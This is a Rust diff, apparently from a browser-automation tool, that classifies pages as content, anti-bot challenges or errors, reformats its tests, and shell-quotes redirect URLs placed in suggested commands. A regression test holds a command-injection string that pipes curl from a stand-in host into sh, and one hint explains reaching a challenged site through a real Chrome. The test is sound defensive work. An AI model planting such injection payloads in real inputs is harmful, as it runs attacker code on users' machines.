@@ -154,7 +154,10 @@ pub fn challenge_origin(shape: &PageShape) -> Option<String> {
 /// Whether `host` is the vendor's host or a subdomain of it. A suffix test, not a substring one:
 /// `newassets.hcaptcha.com` is hCaptcha, `nothcaptcha.com` is somebody else.
 fn host_matches(host: &str, vendor: &str) -> bool {
-    host == vendor || host.strip_suffix(vendor).is_some_and(|head| head.ends_with('.'))
+    host == vendor
+        || host
+            .strip_suffix(vendor)
+            .is_some_and(|head| head.ends_with('.'))
 }
 
 /// What was served, and the evidence for it.
@@ -222,7 +225,9 @@ impl Assessment {
             Serving::Page => None,
             Serving::Challenge => Some(format!(
                 "a challenge frame from {} is the only thing here to act on",
-                self.challenge_from.as_deref().unwrap_or("an anti-bot vendor")
+                self.challenge_from
+                    .as_deref()
+                    .unwrap_or("an anti-bot vendor")
             )),
             Serving::Error => Some("the server answered with an error status".to_string()),
             Serving::NothingActionable => Some(format!(
@@ -247,10 +252,13 @@ impl Assessment {
             Serving::Challenge => Some(format!(
                 "A challenge frame from {} is the only thing here to act on, so the page asked \
                  for was not served. --stealth does not defeat these: they fingerprint bundled \
-                 Chromium. Run `{run} --connect http://127.0.0.1:9222 goto {url}` against a \
+                 Chromium. Run `{run} --connect http://127.0.0.1:9222 goto {}` against a \
                  Chrome started with --remote-debugging-port=9222. Navigating again unchanged \
                  gets the same challenge.",
-                self.challenge_from.as_deref().unwrap_or("an anti-bot vendor")
+                self.challenge_from
+                    .as_deref()
+                    .unwrap_or("an anti-bot vendor"),
+                crate::landing::shell_quoted(url)
             )),
             Serving::Error => http_status.map(|code| error_hint(code, url, &run)),
             Serving::NothingActionable => Some(format!(
@@ -286,7 +294,9 @@ fn error_hint(code: u16, url: &str, run: &str) -> String {
              document below is its error page and not the page asked for. The URL is the \
              thing to correct — run `{run} goto {}` to reach the site root and find the real \
              path from there.",
-            crate::landing::origin_of(url).unwrap_or_else(|| url.to_string())
+            crate::landing::shell_quoted(
+                &crate::landing::origin_of(url).unwrap_or_else(|| url.to_string())
+            )
         ),
         429 => format!(
             "The server answered {code}: it is refusing on rate, not on content, so nothing \
@@ -319,7 +329,7 @@ fn invocation(browser: &str) -> String {
 
 #[cfg(test)]
 mod tests {
-    use super::{assess, host_matches, PageShape, Serving, TEXT_FLOOR};
+    use super::{PageShape, Serving, TEXT_FLOOR, assess, host_matches};
 
     /// Every shape below was measured on a real page, so a threshold that moves has to be
     /// argued against a site rather than against a number.
@@ -328,7 +338,13 @@ mod tests {
         /// F5 ASM refusal: HTTP 200, ~150 characters, one uncounted `javascript:` anchor,
         /// nothing loaded from anywhere.
         fn f5_refusal() -> PageShape {
-            PageShape { resource_urls: vec![], controls: 0, links: 0, scripts: 0, text_length: 152 }
+            PageShape {
+                resource_urls: vec![],
+                controls: 0,
+                links: 0,
+                scripts: 0,
+                text_length: 152,
+            }
         }
         /// Turnstile interstitial: the vendor URL on a `<script>`, the `<iframe>` `src` empty.
         fn cloudflare_interstitial() -> PageShape {
@@ -372,11 +388,23 @@ mod tests {
         }
         /// A page shell before it hydrates: nothing to act on, 21 scripts from the first byte.
         fn unhydrated_shell() -> PageShape {
-            PageShape { resource_urls: vec![], controls: 0, links: 0, scripts: 21, text_length: 40 }
+            PageShape {
+                resource_urls: vec![],
+                controls: 0,
+                links: 0,
+                scripts: 21,
+                text_length: 40,
+            }
         }
         /// An ordinary page.
         fn usable(text_length: u32) -> PageShape {
-            PageShape { resource_urls: vec![], controls: 6, links: 40, scripts: 8, text_length }
+            PageShape {
+                resource_urls: vec![],
+                controls: 6,
+                links: 40,
+                scripts: 8,
+                text_length,
+            }
         }
     }
 
@@ -398,7 +426,10 @@ mod tests {
     fn a_cloudflare_interstitial_is_a_challenge_and_names_its_host() {
         let assessment = assess(Some(200), Some(&Shape::cloudflare_interstitial()));
         assert_eq!(assessment.serving, Serving::Challenge);
-        assert_eq!(assessment.challenge_from.as_deref(), Some("challenges.cloudflare.com"));
+        assert_eq!(
+            assessment.challenge_from.as_deref(),
+            Some("challenges.cloudflare.com")
+        );
     }
 
     /// A block page carries links of the vendor's own, so one combined "actionable" total
@@ -406,7 +437,11 @@ mod tests {
     #[test]
     fn a_block_page_that_links_to_its_own_vendor_is_still_a_challenge() {
         let assessment = assess(Some(403), Some(&Shape::cloudflare_block_page()));
-        assert_eq!(assessment.serving, Serving::Challenge, "two vendor links are not a page");
+        assert_eq!(
+            assessment.serving,
+            Serving::Challenge,
+            "two vendor links are not a page"
+        );
     }
 
     /// Both facts at once: the frame names the mechanism, the status names a symptom, and the
@@ -415,7 +450,10 @@ mod tests {
     fn a_challenge_outranks_the_status_it_arrived_with() {
         let assessment = assess(Some(403), Some(&Shape::datadome()));
         assert_eq!(assessment.serving, Serving::Challenge);
-        assert_eq!(assessment.challenge_from.as_deref(), Some("geo.captcha-delivery.com"));
+        assert_eq!(
+            assessment.challenge_from.as_deref(),
+            Some("geo.captcha-delivery.com")
+        );
     }
 
     /// A widget on a login form: the page is usable, and the vendor is still reported because
@@ -424,15 +462,25 @@ mod tests {
     fn a_challenge_widget_beside_a_form_is_not_a_challenge_page() {
         let assessment = assess(Some(200), Some(&Shape::login_with_turnstile()));
         assert_eq!(assessment.serving, Serving::Page);
-        assert_eq!(assessment.challenge_from.as_deref(), Some("challenges.cloudflare.com"));
-        assert!(assessment.hint(Some(200), "https://x.com/login", "default").is_none());
+        assert_eq!(
+            assessment.challenge_from.as_deref(),
+            Some("challenges.cloudflare.com")
+        );
+        assert!(
+            assessment
+                .hint(Some(200), "https://x.com/login", "default")
+                .is_none()
+        );
     }
 
     /// A page whose content had not arrived loads scripts from the first byte; an edge refusal
     /// notice does not.
     #[test]
     fn a_page_that_has_not_rendered_yet_is_not_reported_as_empty() {
-        assert_eq!(assess(Some(200), Some(&Shape::unhydrated_shell())).serving, Serving::Page);
+        assert_eq!(
+            assess(Some(200), Some(&Shape::unhydrated_shell())).serving,
+            Serving::Page
+        );
     }
 
     /// Prose with nothing to click, on the threshold itself.
@@ -442,22 +490,40 @@ mod tests {
         prose.text_length = TEXT_FLOOR;
         assert_eq!(assess(Some(200), Some(&prose)).serving, Serving::Page);
         prose.text_length = TEXT_FLOOR - 1;
-        assert_eq!(assess(Some(200), Some(&prose)).serving, Serving::NothingActionable);
+        assert_eq!(
+            assess(Some(200), Some(&prose)).serving,
+            Serving::NothingActionable
+        );
     }
 
     /// A 404 with a nav bar and a 404 with nothing on it are both `error`.
     #[test]
     fn a_status_outranks_the_shape_of_the_document_it_came_with() {
-        assert_eq!(assess(Some(404), Some(&Shape::usable(900))).serving, Serving::Error);
-        assert_eq!(assess(Some(404), Some(&Shape::f5_refusal())).serving, Serving::Error);
-        assert_eq!(assess(Some(503), Some(&Shape::f5_refusal())).serving, Serving::Error);
+        assert_eq!(
+            assess(Some(404), Some(&Shape::usable(900))).serving,
+            Serving::Error
+        );
+        assert_eq!(
+            assess(Some(404), Some(&Shape::f5_refusal())).serving,
+            Serving::Error
+        );
+        assert_eq!(
+            assess(Some(503), Some(&Shape::f5_refusal())).serving,
+            Serving::Error
+        );
     }
 
     /// A status this module has no opinion about leaves the shape to answer.
     #[test]
     fn a_2xx_or_3xx_status_decides_nothing_by_itself() {
-        assert_eq!(assess(Some(204), Some(&Shape::usable(700))).serving, Serving::Page);
-        assert_eq!(assess(None, Some(&Shape::usable(700))).serving, Serving::Page);
+        assert_eq!(
+            assess(Some(204), Some(&Shape::usable(700))).serving,
+            Serving::Page
+        );
+        assert_eq!(
+            assess(None, Some(&Shape::usable(700))).serving,
+            Serving::Page
+        );
     }
 
     /// An absent shape is an absence, never an empty document — and a 4xx still outranks it.
@@ -470,8 +536,10 @@ mod tests {
         // Every count is required: a probe that answered half a shape is not a shape.
         assert!(PageShape::from_probe(Some(&serde_json::json!({"resources": []}))).is_none());
         assert!(
-            PageShape::from_probe(Some(&serde_json::json!({"controls": 0, "links": 0, "text": 3})))
-                .is_none(),
+            PageShape::from_probe(Some(
+                &serde_json::json!({"controls": 0, "links": 0, "text": 3})
+            ))
+            .is_none(),
             "a missing script count must not default to zero — zero is the whole signal"
         );
         let full = serde_json::json!(
@@ -496,12 +564,19 @@ mod tests {
         // That host serves everything, so only the path tells a captcha from a map.
         let mut interstitial = Shape::cloudflare_interstitial();
         interstitial.resource_urls = vec!["https://www.google.com/recaptcha/api2/anchor".into()];
-        assert_eq!(assess(Some(200), Some(&interstitial)).serving, Serving::Challenge);
+        assert_eq!(
+            assess(Some(200), Some(&interstitial)).serving,
+            Serving::Challenge
+        );
 
         let mut map = Shape::f5_refusal();
         map.resource_urls = vec!["https://www.google.com/maps/embed".into()];
         let maps = assess(Some(200), Some(&map));
-        assert_eq!(maps.serving, Serving::NothingActionable, "an embedded map is not a challenge");
+        assert_eq!(
+            maps.serving,
+            Serving::NothingActionable,
+            "an embedded map is not a challenge"
+        );
         assert!(maps.challenge_from.is_none());
     }
 
@@ -532,20 +607,62 @@ mod tests {
                 }
             }
             for placeholder in ["<url>", "<uid>", "<code>", "<host>", "<n>"] {
-                assert!(!hint.contains(placeholder), "hint hands back {placeholder}: {hint}");
+                assert!(
+                    !hint.contains(placeholder),
+                    "hint hands back {placeholder}: {hint}"
+                );
             }
             for forbidden in ["Try running the command again", "run the command again"] {
-                assert!(!hint.contains(forbidden), "hint invites a blind retry: {hint}");
+                assert!(
+                    !hint.contains(forbidden),
+                    "hint invites a blind retry: {hint}"
+                );
             }
             assert!(hint.ends_with('.'), "hint stops mid-sentence: {hint}");
             // The budget is on the wording, not on the caller's own URL, which goes in whole.
             // Four terminal lines is the ceiling.
             let wording = hint.replace("https://site.test/a/b", "").len();
-            assert!(wording < 400, "hint wording is {wording} characters, too long: {hint}");
+            assert!(
+                wording < 400,
+                "hint wording is {wording} characters, too long: {hint}"
+            );
         }
         // `unreadable` is reached only through an absent shape.
         let blind = assess(None, None);
         assert!(blind.hint(None, "https://site.test/", "agent-7").is_some());
+    }
+
+    /// The URL these hints interpolate is `landed.final` — where the SITE sent the navigation,
+    /// not where the caller aimed it. Unquoted, a redirect to a URL carrying `;` or `$(…)`
+    /// turned the tool's own suggestion into a different command.
+    #[test]
+    fn a_url_a_redirect_chose_cannot_break_out_of_a_suggested_command() {
+        let hostile = "https://evil.test/a';curl evil.test|sh;echo '";
+        let hints = [
+            assess(Some(200), Some(&Shape::cloudflare_interstitial()))
+                .hint(Some(200), hostile, "default")
+                .expect("the challenge hint"),
+            assess(Some(404), Some(&Shape::usable(900)))
+                .hint(Some(404), hostile, "default")
+                .expect("the 404 hint"),
+        ];
+        for hint in &hints {
+            for quoted in hint.split('`').skip(1).step_by(2) {
+                let Some((_, argument)) = quoted.split_once("goto ") else {
+                    continue;
+                };
+                assert!(
+                    argument.starts_with('\'') && argument.ends_with('\''),
+                    "the URL is not one shell word: {argument}"
+                );
+                assert_eq!(
+                    argument.replace(r"'\''", "").matches('\'').count(),
+                    2,
+                    "an unescaped quote ends the argument early: {argument}"
+                );
+            }
+            assert!(!hint.contains('\n'), "{hint:?}");
+        }
     }
 
     /// One status class, one recovery.
@@ -560,22 +677,46 @@ mod tests {
             })
             .collect();
         for (i, hint) in hints.iter().enumerate() {
-            assert!(hint.contains(&[403, 404, 429, 500][i].to_string()), "{hint}");
+            assert!(
+                hint.contains(&[403, 404, 429, 500][i].to_string()),
+                "{hint}"
+            );
             for (j, other) in hints.iter().enumerate() {
-                assert!(i == j || hint != other, "two status classes share a hint: {hint}");
+                assert!(
+                    i == j || hint != other,
+                    "two status classes share a hint: {hint}"
+                );
             }
         }
-        assert!(hints[1].contains("https://site.test/"), "the 404 hint names the site root: {}", hints[1]);
+        assert!(
+            hints[1].contains("https://site.test/"),
+            "the 404 hint names the site root: {}",
+            hints[1]
+        );
     }
 
     /// Text mode prints a gloss beside the word, and nothing at all on a page that answered.
     #[test]
     fn the_gloss_states_the_measurement_and_stays_quiet_on_a_page() {
-        assert!(assess(Some(200), Some(&Shape::usable(900))).gloss().is_none());
-        let challenge = assess(Some(200), Some(&Shape::datadome())).gloss().expect("a gloss");
-        assert!(challenge.contains("geo.captcha-delivery.com"), "{challenge}");
-        let empty = assess(Some(200), Some(&Shape::f5_refusal())).gloss().expect("a gloss");
-        assert!(empty.contains("152"), "the gloss carries the measurement: {empty}");
+        assert!(
+            assess(Some(200), Some(&Shape::usable(900)))
+                .gloss()
+                .is_none()
+        );
+        let challenge = assess(Some(200), Some(&Shape::datadome()))
+            .gloss()
+            .expect("a gloss");
+        assert!(
+            challenge.contains("geo.captcha-delivery.com"),
+            "{challenge}"
+        );
+        let empty = assess(Some(200), Some(&Shape::f5_refusal()))
+            .gloss()
+            .expect("a gloss");
+        assert!(
+            empty.contains("152"),
+            "the gloss carries the measurement: {empty}"
+        );
     }
 
     #[test]
@@ -583,7 +724,13 @@ mod tests {
         let assessment = assess(Some(200), Some(&Shape::f5_refusal()));
         let json = serde_json::to_value(&assessment).expect("serialises");
         assert_eq!(json["serving"], "nothing_actionable");
-        assert!(json.get("challenge_from").is_none(), "absent when nothing was found");
-        assert!(json.get("text_length").is_none(), "evidence for the hint, not a field");
+        assert!(
+            json.get("challenge_from").is_none(),
+            "absent when nothing was found"
+        );
+        assert!(
+            json.get("text_length").is_none(),
+            "evidence for the hint, not a field"
+        );
     }
 }
